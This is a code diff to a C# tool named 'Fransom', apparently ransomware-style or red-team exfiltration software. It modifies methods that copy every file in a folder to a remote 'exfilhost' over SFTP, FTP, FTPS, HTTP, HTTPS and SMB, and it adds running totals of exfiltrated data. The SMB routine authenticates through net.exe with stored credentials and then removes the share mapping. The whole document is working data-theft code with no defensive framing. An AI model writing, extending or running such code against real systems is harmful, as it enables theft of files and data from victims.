@@ -58,14 +58,19 @@ namespace Fransom
             {
                 client.Connect();
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+                long d = 0;
+
                 foreach (FileSystemInfo info in infos)
                 {
-                        using (var fileStream = new FileStream(info.FullName, FileMode.Open))
-                        {
-                        Console.WriteLine("Exfiltrating " + info.Name + " using SFTP");
-                            client.UploadFile(fileStream, "/uploads/" + info.Name);
-                        }
+                    using (var fileStream = new FileStream(info.FullName, FileMode.Open))
+                    {
+                        client.UploadFile(fileStream, "/uploads/" + info.Name);
+                        FileInfo f = new FileInfo(info.FullName);
+                        d += f.Length / (1024 * 1024);
+                        Console.WriteLine("[*] Exfiltrated " + info.Name + " using SFTP. Total exfil'd data: " + d + " megabytes");
+                    }
                 }
+                Console.WriteLine("exit");
             }
         }
         public void ExfilFTP()
@@ -74,10 +79,13 @@ namespace Fransom
             {
                 client.Connect();
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+                long d = 0;
                 foreach (FileSystemInfo info in infos)
                 {
-                    Console.WriteLine("Exfiltrating " + info.Name + " using FTP");
                     client.UploadFile(info.FullName, "/uploads/" + info.Name);
+                    FileInfo f = new FileInfo(info.FullName);
+                    d += f.Length / (1024 * 1024);
+                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTP. Total exfil'd data: " + d + " megabytes");
                 }
             }
         }
@@ -86,11 +94,19 @@ namespace Fransom
             using (var client = new FtpClient(exfilhost, user, pass))
             {
                 client.AutoConnect(); // AutoConnect handles ftps
+                Console.WriteLine("Connected!");
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+                long d = 0;
+
+                client.EncryptionMode = FtpEncryptionMode.Explicit;
+                client.DataConnectionType = FtpDataConnectionType.PASV;
                 foreach (FileSystemInfo info in infos)
                 {
-                    Console.WriteLine("Exfiltrating " + info.Name + " using FTPS");
+                    FileInfo f = new FileInfo(info.FullName);
+                    d += f.Length / (1024 * 1024);
                     client.UploadFile(info.FullName, "/" + info.Name);
+
+                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTPS. Total exfil'd data: " + d + " megabytes");
                 }
             }
         }
@@ -103,9 +119,13 @@ namespace Fransom
                 client.Proxy = defaultWebProxy;
                 client.UseDefaultCredentials = true;
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+
+                long d = 0;
                 foreach (FileSystemInfo info in infos)
                 {
-                    Console.WriteLine("Exfiltrating " + info.Name + " using HTTP");
+                    FileInfo f = new FileInfo(info.FullName);
+                    d += f.Length / (1024 * 1024);
+                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTP. Total exfil'd data: " + d + " megabytes");
                     client.UploadFile("http://" + exfilhost + "/blackhole", info.FullName);
                 }
             }
@@ -120,10 +140,13 @@ namespace Fransom
                 client.Proxy = defaultWebProxy;
                 client.UseDefaultCredentials = true;
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+                long d = 0;
                 foreach (FileSystemInfo info in infos)
                 {
-                    Console.WriteLine("Exfiltrating " + info.Name + " using HTTPS");
                     client.UploadFile("https://" + exfilhost + "/blackhole", info.FullName);
+                    FileInfo f = new FileInfo(info.FullName);
+                    d += f.Length / (1024 * 1024);
+                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTPS. Total exfil'd data: " + d + " megabytes");
                 }
             }
 
@@ -131,26 +154,40 @@ namespace Fransom
         public void ExfilSMB()
         {
             // quick and dirty
-            Console.WriteLine("Authenticating towards SMB share");
+            Console.WriteLine("[*] Authenticating towards SMB share");
             Process process = new Process();
-            process.StartInfo.FileName = "net.exe";
-            process.StartInfo.Arguments = "use \\\\" + exfilhost + "\\uploads" + " /user:.\\" + user + " " + pass;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.RedirectStandardError = true;
-            process.Start();
-            string output = process.StandardOutput.ReadToEnd();
-            string err = process.StandardError.ReadToEnd();
-            process.WaitForExit();
-
-            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
-            foreach (FileSystemInfo info in infos)
+            string output, err;
+            try
             {
-                Console.WriteLine("Exfiltrating " + info.Name + " using SMB");
-                File.Copy(info.FullName, "\\\\" + exfilhost + "\\uploads\\" + info.Name);
+                process.StartInfo.FileName = "net.exe";
+                process.StartInfo.Arguments = "use \\\\" + exfilhost + "\\uploads" + " /user:.\\" + user + " " + pass;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+                output = process.StandardOutput.ReadToEnd();
+                err = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+            } catch (Exception e)
+            {
+                Console.WriteLine("[X] SMB connection failed: " + e.Message);
+                return;
             }
 
-            Console.WriteLine("Clearing SMB share credentials");
+            Console.WriteLine("[*] Authentication success");
+
+            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
+            long d = 0;
+            foreach (FileSystemInfo info in infos)
+            {
+                FileInfo f = new FileInfo(info.FullName);
+                d += f.Length / (1024 * 1024);
+
+                File.Copy(info.FullName, "\\\\" + exfilhost + "\\uploads\\" + info.Name);
+                Console.WriteLine("[*] Exfiltrated " + info.Name + " using SMB. Total exfil'd data: " + d + " megabytes");
+            }
+
+            Console.WriteLine("[*] Clearing SMB share credentials");
             process.StartInfo.Arguments = "use /delete \\\\" + exfilhost + "\\uploads";
             process.Start();
             output = process.StandardOutput.ReadToEnd();
